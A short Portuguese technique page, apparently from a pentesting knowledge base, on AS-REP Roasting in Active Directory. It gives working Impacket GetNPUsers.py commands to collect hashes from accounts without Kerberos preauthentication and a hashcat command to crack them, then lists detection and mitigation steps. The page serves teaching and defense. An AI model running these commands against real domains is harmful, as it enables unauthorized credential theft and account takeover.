---
title: AS-REP Roasting
description: Contas sem pré-autenticação Kerberos expõem material para quebra offline.
order: 2
---

## O que é

Quando a opção **"Do not require Kerberos preauthentication"**
(`DONT_REQ_PREAUTH`) está ativa em uma conta, qualquer pessoa pode pedir um AS-REP
para ela sem saber a senha. A resposta contém dados cifrados com a senha do
usuário, que podem ser quebrados offline.

## Exploração

Com uma lista de usuários (não exige credencial):

```bash
GetNPUsers.py dominio.local/ -usersfile usuarios.txt -no-pass \
  -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.txt
```

Com credencial válida, a ferramenta consulta o LDAP e encontra as contas sozinha:

```bash
GetNPUsers.py dominio.local/usuario:'Senha123' -dc-ip 10.0.0.10 -request
```

Quebrar com hashcat (modo `18200`):

```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

## Detecção e mitigação

- Manter a pré-autenticação habilitada em todas as contas. Para encontrar as que
  não têm:

  ```powershell
  Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth
  ```

- Senhas fortes nas contas em que a exceção for realmente necessária.
- Monitorar o evento **4768** com tipo de pré-autenticação `0`.
